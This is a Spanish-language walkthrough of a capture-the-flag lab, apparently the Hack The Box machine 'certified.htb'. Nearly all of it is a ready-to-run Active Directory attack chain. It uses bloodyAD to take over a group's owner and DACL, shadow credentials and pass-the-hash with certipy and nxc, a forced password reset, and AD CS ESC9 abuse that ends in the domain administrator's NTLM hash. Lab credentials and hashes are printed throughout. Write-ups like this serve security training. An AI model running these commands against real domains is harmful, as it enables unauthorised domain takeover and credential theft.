Enumeración

Assumed breach

# Credenciales -> judith.mader:judith09

Movimiento lateral

Convertirnos en propietarios del grupo

bloodyAD --host dc01.certified.htb --dc-ip 10.129.231.186 -d "certified.htb" -u 'judith.mader' -p 'judith09' set owner 'Management' 'judith.mader'

Modificar DACL

bloodyAD --host dc01.certified.htb --dc-ip 10.129.231.186 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add genericAll 'CN=Management,CN=Users,DC=certified,DC=htb' 'judith.mader''
# Ver CN en LDAP

Agregarnos al grupo

bloodyAD -u 'judith.mader' -p 'judith09' -d 'certified.htb' --host 10.129.231.186 add groupMember 'Management' judith.mader

Movimiento lateral

Shadow credentials

certipy-ad shadow auto -username 'judith.mader'@'certified.htb' -password 'judith09' -account 'management_svc'

Movimiento lateral

Cambiar contraseña de ca_operator

nxc smb 10.129.231.186 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' -M change-password -o USER=ca_operator NEWPASS='pass123'

Escalada de Privilegios: ESC9

Enumerar AD CS vulnerables

certipy-ad find -u 'ca_operator' -p 'pass123' -dc-ip 10.129.231.186 -vulnerable
Elegimos un usuario attacker y un usuario victim: management_svc abusa de GenericAll / GenericWrite sobre ca_operator.

1. Agregar a la víctima al UPN del Administrador

certipy-ad account -u 'management_svc@certified.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -dc-ip '10.129.231.186' -upn 'administrator' -user 'ca_operator' update

2. Solicitar certificado.pfx para la víctima con la plantilla vulnerable

# Solicitar con credenciales de victim
certipy-ad req -u 'ca_operator' -p 'pass123' -dc-ip '10.129.231.186' -target 'dc01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
# Solicitar con kerberos KRB5CCNAME y la flag -k 
certipy-ad req -k -dc-ip '10.129.231.186' -target 'dc01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
# Obtenemos administrator.pfx

3. Revertir el UPN de la víctima

certipy-ad account -u 'management_svc@certified.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'ca_operator@certified.htb' update

4. Autenticarnos como administrator para conseguir su hash NTLM

certipy-ad auth -pfx administrator.pfx -domain 'certified.htb' -dc-ip '10.129.231.186'
# Obtenemos Hash_NTLM de Administrator
